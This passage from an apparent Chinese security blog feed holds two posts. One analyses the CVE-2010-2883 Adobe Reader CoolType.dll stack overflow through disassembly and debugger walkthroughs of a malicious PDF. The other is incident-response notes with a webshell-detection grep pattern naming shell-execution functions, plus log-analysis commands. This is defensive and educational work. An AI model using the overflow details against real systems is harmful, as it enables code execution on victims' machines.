    <title>CVE-2010-2883栈溢出漏洞分析及复现</title>
    <link href="https://hexchristmas.github.io/p/8b44.html"/>
    <id>https://hexchristmas.github.io/p/8b44.html</id>
    <published>2020-04-18T01:28:45.000Z</published>
    <updated>2020-04-17T17:42:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1>CVE-2010-2883栈溢出漏洞分析及复现</h1><h2 id="0x00-概述">0x00 概述</h2><p>CVE-2010-2883漏洞已经出来很久了，很多人已经分析复现过了，最近在搞pwn这块，准备把栈溢出弄一下，是adobereader中的一个0day，由于CoolType.dll中堆栈缓冲区溢出错误使攻击者通过pdf中的ttf字体在SING表中具有长字段PDF文档进行转换，当用户安全意识比较低的时候打开了具有恶意代码的pdf文件就有可能造成任意代码执行或拒绝服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">什么是CoolType.dll？</span><br><span class="line">Cooltype.dll全称是&quot;CoolType Typography Engine&quot;，adobe systems的一个动态链接库，属于Cooltype的一部分</span><br></pre></td></tr></table></figure><h2 id="0x01-受影响版本">0x01 受影响版本</h2><ul><li>Windows&amp;Mac&amp;Unix的Adobe Reader9.3.4版本及之前</li><li>Windows&amp;Mac&amp;Unix的Adobe Acroba9.3.4版本及之前</li></ul><h2 id="0x02-分析环境">0x02 分析环境</h2><table><thead><tr><th></th><th>使用环境</th></tr></thead><tbody><tr><td>system</td><td>Windows XP Professional SP3</td></tr><tr><td>调试器</td><td>Olldbg</td></tr><tr><td>反汇编</td><td>IDA Pro</td></tr><tr><td>漏洞版本</td><td>Adobe Reader : 9.3.4</td></tr></tbody></table><h2 id="0x04-漏洞分析">0x04 漏洞分析</h2><h3 id="CoolType-dll，定位到出现漏洞的位置">CoolType.dll，定位到出现漏洞的位置</h3><p><img src="/p/8b44/3.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DBF2                 push    ebp</span><br><span class="line">.text:0803DBF3                 sub     esp, 104h       ; 分配空间</span><br><span class="line">.text:0803DBF9                 lea     ebp, [esp-4]    ; strcat将执行结果保存在ebp中</span><br><span class="line">.text:0803DBFD                 mov     eax, ___security_cookie</span><br><span class="line">.text:0803DC02                 xor     eax, ebp</span><br><span class="line">.text:0803DC04                 mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DC0A                 push    4Ch</span><br><span class="line">.text:0803DC0C                 mov     eax, offset loc_81847C4</span><br><span class="line">.text:0803DC11                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DC16                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DC1C                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DC22                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DC28                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DC2B                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DC2E                 call    sub_8041626</span><br><span class="line">.text:0803DC33                 xor     esi, esi</span><br><span class="line">.text:0803DC35                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DC39 ;   try &#123;</span><br><span class="line">.text:0803DC39                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DC3C                 jz      loc_803DDF9</span><br><span class="line">.text:0803DC42                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DC45                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DC48                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DC48 ;   &#125; // starts at 803DC39</span><br><span class="line">.text:0803DC4C ;   try &#123;</span><br><span class="line">.text:0803DC4C                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DC50                 jnz     loc_803DDA2</span><br><span class="line">.text:0803DC56                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DC5B                 push    edi             ; int</span><br><span class="line">.text:0803DC5C                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DC5F                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DC63                 call    sub_802178F</span><br><span class="line">.text:0803DC68                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DC6B                 jnz     short loc_803DCD6</span><br><span class="line">.text:0803DC6D                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DC72                 push    edi             ; int</span><br><span class="line">.text:0803DC73                 lea     ecx, [ebp+108h+var_12C] ; 指向虚表的指针</span><br><span class="line">.text:0803DC76                 call    sub_8021ABE     ; 处理sing表</span><br><span class="line">.text:0803DC7B                 mov     eax, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DC7E                 cmp     eax, esi        ; 判断是否为空</span><br><span class="line">.text:0803DC7E ;   &#125; // starts at 803DC4C</span><br><span class="line">.text:0803DC80 ;   try &#123;</span><br><span class="line">.text:0803DC80                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DC84                 jz      short loc_803DCBD ; 不跳转</span><br><span class="line">.text:0803DC86                 mov     ecx, [eax]      ; 版本号</span><br><span class="line">.text:0803DC88                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DC8E                 jz      short loc_803DC98 ; 跳转</span><br><span class="line">.text:0803DC90                 cmp     ecx, 100h</span><br><span class="line">.text:0803DC96                 jnz     short loc_803DCB9</span><br><span class="line">.text:0803DC98</span><br><span class="line">.text:0803DC98 loc_803DC98:                            ; CODE XREF: sub_803DBF2+9C↑j</span><br><span class="line">.text:0803DC98                 add     eax, 10h        ; 寻找uniqueName，相对sing表入口偏移0x10</span><br><span class="line">.text:0803DC9B                 push    eax             ; char *</span><br><span class="line">.text:0803DC9C                 lea     eax, [ebp+108h+var_108] ; 目的地址是一段固定大小的栈空间，就是前面申请的空间</span><br><span class="line">.text:0803DC9F                 push    eax             ; char *</span><br><span class="line">.text:0803DCA0                 mov     [ebp+108h+var_108], 0 </span><br><span class="line">.text:0803DCA4                 call    strcat ;造成溢出</span><br></pre></td></tr></table></figure><h3 id="PdfStreamDumper分析pdf样本">PdfStreamDumper分析pdf样本</h3><p><img src="/p/8b44/4.png" alt><br>我们可以看到sing数据是0x11C开始的,sing数据长度是0x1DDF，sing从真实数据偏移0x10为uniqueName域,入口偏移0x11c为sing表的真实数据，也就是从00 00 01 00开始的部分偏移0x10就能找到uniqueName域(uniqueName域是个28字节大小的结构)，执行strcat后，会将58 E0 8D AD起始的复制到ebp指定的地址中，直到遇到NULL字符串终止符，也就是strcat进行字符串拼接时没有进行长度判断，导致栈溢出</p><h3 id="010edit确定偏移位">010edit确定偏移位</h3><p><img src="/p/8b44/5.png" alt><br>在线offset 11ch发现<br><img src="/p/8b44/6.png" alt><br>从0x10开始偏移，字段是uniqueName，大小为28字节，以x00结尾<br><img src="/p/8b44/7.png" alt></p><h2 id="od动态调试">od动态调试</h2><p>先打开adobe reader,再打开od,attach到adobe reader进程上，f9运行，由于我们刚刚分析到sing地址在0803DC6D被引用，所以在0803DC6D下断点<br><img src="/p/8b44/8.png" alt><br>将带有恶意程序到样本用reader打开，程序就会停在断点上面<br><img src="/p/8b44/9.png" alt><br>我们可以看到ecx是指向0012EB00，到数据窗口查询指针存放到数据<br><img src="/p/8b44/10.png" alt></p><table><thead><tr><th>Type</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>Fixed</td><td>sfntversion</td><td>65536 (0x00010000)forversion1.0</td></tr><tr><td>USHORT</td><td>numTables</td><td>Number of tables</td></tr><tr><td>USHORT</td><td>searchRange</td><td>(Maximumpowerof2≤numTables)x16</td></tr><tr><td>USHORT</td><td>entrySelector</td><td>Log2(Maximum powerof 2≤numTables)</td></tr><tr><td>USHORT</td><td>rangeShiH</td><td>numTablesx16-searchRange</td></tr></tbody></table><p>我们可以看到在ttf字体文件中，从0字节偏移的位置有一个表目录，这个表目录第一个字段命是sfnt version，用来声明ttf格式版本的，我们看描述可以知道1.0版本的ttf字体文件是以0x00010000来表示版本的，075E3B70处的数数据正好是0x00010000，那么我们就可以判断ecx中保存的是sing的版本好<br>调用call指令，实际上这个call实际上是处理sing的表，单步，单步<br><img src="/p/8b44/11.png" alt><br><img src="/p/8b44/12.png" alt></p>]]></content>
    
    <summary type="html">
    
      CVE-2010-2883漏洞已经出来很久了，很多人已经分析复现过了，最近在搞pwn这块，准备把栈溢出弄一下，是adobereader中的一个0day，由于CoolType.dll中堆栈缓冲区溢出错误使攻击者通过pdf中的ttf字体在SING表中具有长字段PDF文档进行转换，当用户安全意识比较低的时候打开了具有恶意代码的pdf文件就有可能造成任意代码执行或拒绝服务。
    
    </summary>
    
    
      <category term="exploit" scheme="https://hexchristmas.github.io/tags/exploit/"/>
    
      <category term="CVE" scheme="https://hexchristmas.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>应急响应笔记</title>
    <link href="https://hexchristmas.github.io/p/9065.html"/>
    <id>https://hexchristmas.github.io/p/9065.html</id>
    <published>2020-04-10T22:36:32.000Z</published>
    <updated>2020-04-10T15:30:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1>应急响应笔记</h1><h2 id="如何快速排查webshell？">如何快速排查webshell？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -RPn &quot;(passthru|shell_exec|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|php_uname|eval|tcpflood|udpflood|edoced_46esab|yarra) *\(&quot; /var/www</span><br></pre></td></tr></table></figure><h2 id="Dump内存指令">Dump内存指令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcore PID</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -f -o xxx -e trace=open -p &lt;PID&gt;</span><br></pre></td></tr></table></figure><h2 id="查找具体某天修改过的文件">查找具体某天修改过的文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -newermt &quot;2018-11-27&quot; ! -newermt &quot;2018-11-29&quot;|xargs stat</span><br></pre></td></tr></table></figure><h2 id="查看对应进程占用的端口号">查看对应进程占用的端口号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anop | grep PID</span><br></pre></td></tr></table></figure><h2 id="查看端口号">查看端口号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anplt</span><br></pre></td></tr></table></figure><h2 id="没有netstat怎么办？">没有netstat怎么办？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tunlpa</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk -F &apos;&quot;&apos; &apos;&#123;print $8&#125;&apos;|sort |uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat iis-ex190706.log |awk &apos;$2&gt;&quot;15:22:31&quot;&#123;print $2&#125;&apos; |more</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log | awk &apos;$5&gt;&quot;[28/Jun/2019:01:16:59&quot; &#123;print $5&#125;&apos; |more</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log | awk &apos;$5&gt;=&quot;[28/Jun/2019:01:16:59&quot; &amp;&amp; $5&lt;=&quot;[28/Jun/2019:01:18:59&quot; &#123;print $5&#125;&apos; |more</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log | awk &apos;$5&gt;=&quot;[28/Jun/2019:01:16:59&quot; &amp;&amp; $5&lt;=&quot;[28/Jun/2019:01:18:59&quot; &#123;print $5&#125;&apos; |more</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;split($5,array,&quot;[&quot;);if(array[2]&gt;=&quot;28/Jun/2019:01:15:59&quot; &amp;&amp; array[2]&lt;=&quot;28/Jun/2019:01:17:59&quot;)&#123;print $5&#125;&#125;&apos;  |more</span><br></pre></td></tr></table></figure><h2 id="访问指定资源的日志">访问指定资源的日志</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log | awk &apos;&#123;print $10&#125;&apos; |grep /mobile/static/ |sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><h2 id="访问URL排序">访问URL排序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;print $10&#125;&apos;|sort|uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |cut -f 10 -d &apos; &apos; |sort|uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure><h2 id="统计访问量前10的时间点">统计访问量前10的时间点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;print $5&#125;&apos;|sort|uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |cut -f 5 -d &apos; &apos; |sort|uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure><h2 id="统计总流量">统计总流量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;sum+=$13&#125; END &#123;print sum&#125;&apos;</span><br></pre></td></tr></table></figure><h2 id="状态码统计">状态码统计</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;print $12&#125;&apos; |sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><h2 id="勒索病毒">勒索病毒</h2><ul><li>备份，备份，备份！</li><li>如果您不知道是谁发送了附件，请不要打开附件。</li><li>在您确认该人实际向您发送附件之前，请勿打开附件，</li><li>使用VirusTotal等工具扫描附件  。</li><li>确保所有Windows更新一出现就立即安装！还要确保更新所有程序，尤其是Java，Flash和Adobe Reader。较旧的程序包含恶意软件分发者通常利用的安全漏洞。因此，保持更新非常重要。</li><li>确保使用安装了某种使用行为检测或白名单技术的安全软件。白色上市可能是一种痛苦的训练，但如果你愿意购买它，可能会有最大的回报。</li><li>使用硬密码，不要在多个站点重复使用相同的密码。</li></ul>]]></content>
    
    <summary type="html">
    
      记录一些应急响应中的知识点，笔记，小tips。
    
    </summary>
    
    
      <category term="IncidentResponse" scheme="https://hexchristmas.github.io/tags/IncidentResponse/"/>
    
  </entry>
  
</feed>
